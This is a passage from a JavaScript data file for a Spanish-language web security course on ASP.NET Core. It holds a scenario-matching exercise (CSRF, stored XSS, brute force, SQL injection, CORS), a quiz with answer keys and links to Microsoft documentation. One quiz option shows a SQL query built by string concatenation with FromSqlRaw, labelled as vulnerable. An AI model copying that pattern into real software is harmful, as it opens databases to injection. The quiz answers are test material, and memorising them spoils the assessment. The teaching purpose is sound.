            { t: 'Un formulario oculto en otro sitio hace POST a tu app usando la cookie de sesión del usuario', b: 2, why: 'Es CSRF: el otro sitio no conoce el token antifalsificación.' },
            { t: 'Un “nombre de médico” con una etiqueta script roba tokens a quien abre el listado', b: 3, why: 'Es XSS almacenado.' },
            { t: 'Un bot prueba 10.000 contraseñas por minuto en /login', b: 5, why: 'Fuerza bruta.' },
            { t: 'Un filtro de búsqueda concatenado en SQL permite borrar tablas', b: 4, why: 'Inyección SQL.' },
            { t: 'Querés que solo tu frontend publicado pueda leer las respuestas de la API desde el navegador', b: 1, why: 'CORS con WithOrigins.' },
          ],
        },
      ],
      quiz: [
        { q: '¿Qué hace HSTS?', o: ['Cifra la base de datos.', 'Le indica al navegador que use solo HTTPS con ese sitio durante un tiempo.', 'Bloquea CORS.', 'Limita pedidos.'], a: 1, e: 'Encabezado Strict-Transport-Security.' },
        { q: '¿Quién bloquea una respuesta por CORS?', o: ['El servidor.', 'El navegador.', 'La base de datos.', 'El firewall.'], a: 1, e: 'Por eso Postman no se ve afectado. CORS no protege al servidor.' },
        { q: '<code>http://localhost:5173</code> y <code>http://localhost:7001</code>…', o: ['…tienen el mismo origen.', '…son orígenes distintos (cambia el puerto).', '…solo difieren en la ruta.', '…son el mismo servidor.'], a: 1, e: 'Esquema, host y puerto deben coincidir.' },
        { q: '¿Qué es un pedido preflight?', o: ['Un pedido OPTIONS que el navegador envía antes del real para verificar si está permitido.', 'El primer pedido del día.', 'Un pedido sin cuerpo.', 'Un pedido de login.'], a: 0, e: 'Ocurre con pedidos no simples.' },
        { q: '¿Por qué una API con JWT en el encabezado Authorization es menos vulnerable a CSRF?', o: ['Porque el JWT está cifrado.', 'Porque el navegador no adjunta ese encabezado automáticamente, a diferencia de las cookies.', 'Porque usa HTTPS.', 'No es menos vulnerable.'], a: 1, e: 'CSRF explota credenciales que viajan solas.' },
        { q: '¿Cuál es la defensa principal contra XSS?', o: ['Codificar la salida: mostrar los datos como texto, no como HTML.', 'Usar POST.', 'CORS.', 'Limitar la tasa.'], a: 0, e: 'Más validación de entrada y Content-Security-Policy.' },
        { q: '¿Qué código de estado devuelve el limitador de tasa?', o: ['403', '429', '503', '401'], a: 1, e: 'Too Many Requests.' },
        { q: '¿Cuál de estas consultas es vulnerable a inyección SQL?', o: ['<code>Where(d =&gt; d.Name == nombre)</code>', '<code>FromSql($"... WHERE Name = {nombre}")</code>', '<code>FromSqlRaw($"... WHERE Name = \'{nombre}\'")</code>', 'Ninguna'], a: 2, e: 'FromSqlRaw con texto concatenado no parametriza.' },
      ],
      sources: [
        { title: 'Aplicar HTTPS en ASP.NET Core', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/enforcing-ssl', points: ['UseHttpsRedirection y HSTS.', 'Recomendación para API web: no escuchar HTTP.'] },
        { title: 'Habilitar CORS en ASP.NET Core', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/cors', points: ['Mismo origen; directivas con nombre; WithOrigins.', 'Solicitudes preflight; credenciales; AllowAnyOrigin + AllowCredentials no permitido.', 'Orden de UseCors en el pipeline.'] },
        { title: 'Prevenir ataques XSRF/CSRF', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/anti-request-forgery', points: ['Cómo funciona el ataque con cookies.', 'Tokens antifalsificación; autenticación por token.'] },
        { title: 'Evitar Cross-Site Scripting (XSS)', url: 'https://learn.microsoft.com/es-es/aspnet/core/security/cross-site-scripting', points: ['Codificación de HTML, JavaScript y URL.', 'Validación como defensa adicional.'] },
        { title: 'Middleware de limitación de velocidad', url: 'https://learn.microsoft.com/es-es/aspnet/core/performance/rate-limit', points: ['Ventana fija, deslizante, cubo de tokens y concurrencia.', 'EnableRateLimiting y 429.'] },
        { title: 'Consultas SQL en EF Core', url: 'https://learn.microsoft.com/es-es/ef/core/querying/sql-queries', points: ['FromSql parametriza; FromSqlRaw con concatenación es vulnerable a inyección.'] },
      ],
    },
  );
})();
